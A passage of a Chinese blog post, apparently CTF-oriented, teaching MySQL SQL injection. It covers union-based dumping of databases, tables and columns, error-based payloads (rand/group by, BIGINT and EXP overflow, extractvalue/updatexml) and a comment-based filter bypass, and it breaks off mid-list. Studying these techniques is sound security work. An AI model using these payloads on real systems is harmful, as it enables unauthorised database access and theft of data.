<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="SQL注入攻击定义：SQL其实是一门对数据库操作语言，但是在一些web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操纵；这就是我们常说的SQL注入 原理： 参数用户可控：前端传入后端的内容是用户可以控制的； 参数带入数据库查询：传入的参数拼接到SQL语句，并且带入数据库查询。  与MySQL">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入攻击">
<meta property="og:url" content="http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/index.html">
<meta property="og:site_name" content="w0s1np&#39;s blog">
<meta property="og:description" content="SQL注入攻击定义：SQL其实是一门对数据库操作语言，但是在一些web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操纵；这就是我们常说的SQL注入 原理： 参数用户可控：前端传入后端的内容是用户可以控制的； 参数带入数据库查询：传入的参数拼接到SQL语句，并且带入数据库查询。  与MySQL">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://z3.ax1x.com/2021/04/08/cYQUj1.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/11/19/DMpiLR.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/04/08/cYQPnP.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/11/13/D9tysH.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/11/28/DsGjQP.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/11/28/DsJPij.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/11/28/DsJQY9.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/11/28/DsJNwD.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/11/28/DsJwYd.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/11/28/DsY1Ag.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/25/rWMEsU.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/25/rWMmdJ.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/25/rWl1bD.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/25/rW31tH.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/25/rWaBpF.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/25/rWaXh8.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/25/rfu8RP.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/25/rfuDGq.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/rf6gde.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/rf6fJA.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/rfb8QU.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/rfqtc8.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/rfqI41.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/rfqODe.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/rhQUHS.png">
<meta property="og:image" content="http://example.com/wzimg/1.png">
<meta property="og:image" content="http://example.com/wzimg/2.png">
<meta property="og:image" content="http://example.com/wzimg/3.png">
<meta property="og:image" content="http://example.com/wzimg/4.png">
<meta property="og:image" content="http://example.com/wzimg/5.png">
<meta property="article:published_time" content="2021-04-08T09:24:02.000Z">
<meta property="article:modified_time" content="2021-04-10T07:19:23.036Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://z3.ax1x.com/2021/04/08/cYQUj1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>SQL注入攻击</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/projects_url">Projects</a></li><!--
     --><!--
       --><li><a href="/%5Bobject%20Object%5D">highlight</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2021/04/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2021/04/06/Hexo-github-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&text=SQL注入攻击"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&is_video=false&description=SQL注入攻击"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SQL注入攻击&body=Check out this article: http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&name=SQL注入攻击&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&t=SQL注入攻击"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">SQL注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%EF%BC%9A"><span class="toc-number">1.0.1.</span> <span class="toc-text">定义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.0.2.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8EMySQL%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.0.3.</span> <span class="toc-text">与MySQL相关知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.</span> <span class="toc-text">有回显的union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%8A%A5%E9%94%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.0.5.</span> <span class="toc-text">有报错的报错注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%A0%E6%8A%A5%E9%94%99%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.6.</span> <span class="toc-text">无回显无报错的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.7.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.8.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REGEXP%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.9.</span> <span class="toc-text">REGEXP注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.9.1.</span> <span class="toc-text">基本注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#REGEXP%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.9.2.</span> <span class="toc-text">REGEXP盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LIKE%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.10.</span> <span class="toc-text">LIKE注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IN"><span class="toc-number">1.0.11.</span> <span class="toc-text">IN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Between"><span class="toc-number">1.0.12.</span> <span class="toc-text">Between</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.13.</span> <span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.0.14.</span> <span class="toc-text">无列名注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%88%AB%E5%90%8D"><span class="toc-number">1.0.14.1.</span> <span class="toc-text">构造别名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#join-%E2%80%A6-using-xx"><span class="toc-number">1.0.14.2.</span> <span class="toc-text">join … using(xx)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%EF%BC%9A"><span class="toc-number">1.0.15.</span> <span class="toc-text">文件读写：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-priv%E5%92%8Csecure-file-priv"><span class="toc-number">1.0.15.1.</span> <span class="toc-text">file_priv和secure-file-priv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.15.2.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.15.3.</span> <span class="toc-text">写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%95"><span class="toc-number">1.0.15.3.1.</span> <span class="toc-text">日志法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLOG%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE-%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E4%B8%BAWindows%E6%89%8D%E5%8F%AF%E7%94%A8"><span class="toc-number">1.0.15.4.</span> <span class="toc-text">DNSLOG外带数据(目标系统为Windows才可用)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.16.</span> <span class="toc-text">约束攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Insert-amp-Update-amp-Delete%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.17.</span> <span class="toc-text">Insert&amp;Update&amp;Delete注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.18.</span> <span class="toc-text">[Mysql下Limit注入方法]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%97%B6%E8%BF%98%E5%8F%AF%E8%83%BD%E6%9C%89%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.19.</span> <span class="toc-text">注入时还可能有的一些方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">1.0.20.</span> <span class="toc-text">一些绕过手法总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.0.21.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        SQL注入攻击
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-04-08T09:24:02.000Z" itemprop="datePublished">2021-04-08</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>SQL其实是一门对数据库操作语言，但是在一些<code>web</code>应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操纵；这就是我们常说的SQL注入</p>
<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><ul>
<li>参数用户可控：前端传入后端的内容是用户可以控制的；</li>
<li>参数带入数据库查询：传入的参数拼接到SQL语句，并且带入数据库查询。</li>
</ul>
<h3 id="与MySQL相关知识点："><a href="#与MySQL相关知识点：" class="headerlink" title="与MySQL相关知识点："></a>与MySQL相关知识点：</h3><p>MySQL其实就是一个数据库，再里面储存了很多的数据，在MySQL5.0版本以后，MySQL默认在数据库中存放了一个<code>information_schema</code>数据库，在该库里面，有三个表名值得我们注意：<code>SCHEMATA</code> <code>TABLES</code> <code>COLUMNS</code></p>
<p><code>SCHEMATA</code>表存放在用户储存的所有数据库名，其中字段名为：<code>SCHEMA_NAME</code></p>
<p><code>TABLES</code>表存放在用户储存的所有数据库名和表名，其中字段名分别为：<code>TABLE_SCHEMA</code> <code>TABLE_NAME</code></p>
<p><code>COLUMNS</code>表存放在用户储存的所有数据库名和表名和字段名，其中字段名分别为：<code>TABLE_SCHEMA</code> <code>TABLE_NAME</code> <code>COLUMN_NAME</code></p>
<p><code>CONCAT()</code>：用于将多个字符串连接成一个字符串</p>
<p><code>group_concat()</code>：连接一个组的所有字符串，并以逗号分隔每一条数据。通俗的讲，就是将你查询的结果全部整合一起排出来</p>
<p><code>rand()</code>：返回0到1之间的随机浮点值.。若已指定一个整数参数 N ，rand(N),则N被用作种子值，用来产生重复序列。</p>
<p><code>mid()</code>：MID(column_name,start[,length])，例如：<code>mid(database(),1,1)</code>就是说数据库名从第一个字选取一个字</p>
<p><code>substr()</code>：<code>Substr()</code>和<code>substring()</code>函数实现的功能是一样的，表示被截取的字符串或字符串表达式，参数描述同<code>mid()</code>函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度</p>
<p><code>left()</code>：得到字符串左部指定个数的字符。例如：Left ( string, n ) <code>string</code>为要截取的字符串，n为长度。</p>
<p><code>ord()</code>：此函数为返回第一个字符的ASCII码，例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测<code>database()</code>的第一位ASCII码是否大于114，也即是‘r’。</p>
<p><code>ascii()</code>：将某个字符转换为<code>ascii</code>值；例如：<code>ascii(substr((select database()),1,1))</code>即求得它的<code>ascii</code>码</p>
<h3 id="有回显的union注入"><a href="#有回显的union注入" class="headerlink" title="有回显的union注入"></a>有回显的union注入</h3><p>如果发现有回显，就可以考虑union注入了，UNION的作用是将两个<code>select</code>查询结果合并，如下图：</p>
<p><img src="https://z3.ax1x.com/2021/04/08/cYQUj1.png" alt="b"></p>
<p>在注入之前我们就要找到闭合方式，下面就是常用的闭合吧，闭合之后页面会和每笔和有不一样的变化，所以可以自己分析</p>
<p>当在传参后面加上单引号，和双引号都报错的话说明是整数型。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=1&#x27;</span>)<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">?id=1&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>找到闭合方式是进行<code>sql</code>的前提，这里需要注意的就是如何根据报错来看闭合：</p>
<p>例如：</p>
<p><img src="https://s3.ax1x.com/2020/11/19/DMpiLR.png" alt="sfe"></p>
<p>这里需要注意的就是看报错的时候，注意去除最左边和最右边的一个单引号。</p>
<p>找到闭合之后就可以进行<code>union</code>注入了，先查询列数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3#</span><br></code></pre></td></tr></table></figure>

<p>依次更改数字，当小于等于正确值时，都会正确显示，否则不会显示</p>
<p>然后根据列数进行注入，代码如下：</p>
<p>爆库：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,database()#</span><br><span class="hljs-string">?id=1&#x27;</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>爆表：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></code></pre></td></tr></table></figure>

<p>爆列：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>表名<span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure>

<p>爆数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select &#x27;</span>列名<span class="hljs-string">&#x27; from &#x27;</span>表名<span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure>

<p>好了，这就是有回显的union注入，但是在做题的时候可没这么简单哦，一般都有过滤，我就遇到过过滤union的，这个时候该怎么办，其实解决方法很简单，换个注入方法或者来个注释绕过，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; /!**union**/ .....</span><br></code></pre></td></tr></table></figure>

<p>一般的就成功绕过了，再不行也可以尝试下url加密两次，因为浏览器会进行一次解密，但是这个一般我都没用，但也可以尝试下吧，还不行那就换个方法就是了。</p>
<p>做了一个绕过<code>md5</code>密码的<code>sql</code>注入题我又想起了一些关于<code>union</code>注入的东西：</p>
<p>我们在查询一些数据库没有的东西，他一样会显示出来，就是说也会进行查询，所以当遇到需要检查我们输入的密码和被查询的密码是否相同的时候我们可以进行查询我们自己的密码，在输入刚才查询的密码，其实这也相当于万能密码之类的。</p>
<p><img src="https://z3.ax1x.com/2021/04/08/cYQPnP.png" alt="a"></p>
<p>当没有回显怎么办，先判断是否报错</p>
<h3 id="有报错的报错注入："><a href="#有报错的报错注入：" class="headerlink" title="有报错的报错注入："></a>有报错的报错注入：</h3><p>如果报错，直接报错注入，常见报错方法：</p>
<ol>
<li><p><code>rand()</code>随机数分组报错:即为主键重复</p>
<p>原理：<code>count()</code>和<code>group by</code>在遇到<code>rand()</code>产生的重复值时报错，其实就是<code>count</code>，<code>rand()</code>，<code>group by</code>三个连用就会造成主键重复报错，与位置无关</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></code></pre></td></tr></table></figure>

<p>解释：<code>floor()</code>：向下取整。所以<code>floor(rand(N)*2)</code>只有两个值：0和1。<br><code>group by a</code>：以a进行分组，再计每一组的数。（此时a就代表<code>concat</code>连接而成的字符串），它连接了数据库用户名和随机数（0或1）。<br>只有当种子值为0或-1时，才会报错；所以，为了让它报错而得到我们想要的信息，就要让种子值为0或-1。</p>
<p>因为<code>floor(rand(0))</code>是稳定序列，再查询虚拟表和写入虚拟表的时候，就会产生主键重复。</p>
<p>我们可以把<code>payload</code>中的<code>select user()</code>换成其他的查询，爆出我们想要的东西。</p>
</li>
<li><p><code>Bigint</code>型数据溢出SQL注入：（适用于MYSQL5.5.5及更高版本）</p>
<p>~0：对0按位取反，将得到<code>BIGINT</code>无符号数最大值；所以 ~0加上1后会发生溢出。</p>
<p>当我们执行一条查询时，查询成功会返回0，所以当对查询逻辑取反时，返回值为1。</p>
<p>以我们可以结合~0和逻辑取反，构造基于报错的payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) <span class="hljs-operator">-</span>（ps:这是减号） <span class="hljs-operator">~</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p>解释：x就代表<code>select user()</code>的结果.</p>
</li>
<li><p><code>Double</code>型数据溢出SQL注入:</p>
<p>EXP(X)函数：返回e（自然数）的x方。当X传递一个大于709的值时，函数exp()就会引起一个溢出错误，例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()));<br></code></pre></td></tr></table></figure>

<p>其中<code>~(select user())</code>的值为最大无符号整数，造成<code>exp</code>溢出，顺带会查询出<code>USER()</code>用户名</p>
</li>
<li><p> <code>xpath</code>函数报错:</p>
</li>
</ol>
<p>   <code>XPath</code>即为<code>XML</code>路径语言，它是一种用来确定<code>XML</code>文档中某部分位置的语言。</p>
<p>   <code>extractvalue()</code>函数：对XML文档进行查-询的函数：</p>
<p>   <code>extractvalue(XML_document,Xpath_string)</code></p>
<p>   第一个参数：XML文档对象名称；</p>
<p>   第二个参数：Xpath格式字符串，即文本标记，如 <code>’ /book/author/initial &#39;</code>；</p>
<p>   返回查询值所包含的字符串，但函数的返回长度有限,为32个字符长度。</p>
<p>   <code>updatexml()</code>函数：对XML文档进行修改的函数。</p>
<p>   <code>updatexml(XML_document,Xpath_string,new_value)</code></p>
<p>   第一个参数：XML文档名；</p>
<p>   第二个参数：Xpath格式字符串；</p>
<p>   第三个参数：String格式，用它替换查询到的数据；</p>
<p>   用指定数据替换查询到的内容，同样查询时返回长度限制32个字符。</p>
<p>   上面两个函数都必须传入合法的格式<code>“ /xxx/xx/xxx ”</code></p>
<pre><code> 正常查询语句：
</code></pre>
   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;/good/goood&#x27;</span>);<br>````<br><br>查询结果：查询结果为空，但没有语法错误，所以不会报错,所以不会爆出数据。<br>   不合法的查询语句：<br><br>```<span class="hljs-keyword">sql</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()));<br></code></pre></td></tr></table></figure>

<p>   查询结果：发生了报错，Xpath语法错误，执行了第二个参数里的sql语句，把数据库用户名查出来了</p>
<ol start="5">
<li><p>利用列名的重复性报错：</p>
<p>构造重复的列</p>
